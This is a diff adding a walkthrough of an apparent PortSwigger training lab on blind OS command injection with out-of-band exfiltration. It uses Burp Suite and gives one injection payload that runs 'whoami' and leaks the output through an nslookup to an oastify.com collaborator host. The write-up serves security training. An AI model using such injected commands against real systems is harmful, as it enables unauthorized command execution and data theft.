@@ -150,11 +150,42 @@ We have successfully solved the task
 
 ------------------------------------
 
-#
+# Blind OS command injection with out-of-band data exfiltration
 <hr>
 
 ## Task
 
+![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/75918da9-62b0-436b-89f7-12adc8709650)
+
+Navigate to the website,
+
+![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/7ed04485-449b-4307-91d3-d71e74400bd1)
+![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/dff1fe06-5e81-43d6-a857-33dfffd16b3a)
+
+Capture this request on burpsuite and send it over to burp repeater
+
+We have execute the ```whoami``` command and exfiltrate the output via a DNS query to Burp Collaborator.
+
+![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/dadea7c1-49d2-4eb5-a83e-2016d7a902ce)
+
+Click on "copy to clipboard" to copy the payload to use. So we can use ```nslookup``` with the payload burp collaborator client generated for us to run the ```whoami``` command.
+
+We can use the payload
+```
+||nslookup `whoami`.8clpqlx6r4oe0u0r87hwrnkonft5hu.oastify.com||
+```
+Ensure this is url encoded
+
+![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/6ef52828-66de-4f38-9bce-de0b2543420e)
+
+We got the name of the current  user to be ```peter-WmKLbv```. 
+
+Submitting this name
+
+![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/a91d42c5-bcb6-4931-8bc2-e3e50d04c4b1)
+![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/2be1cde7-c4b1-4625-a8a4-ee0bbb22cb88)
+
+We have successfully completed this lab😎
 
 
 
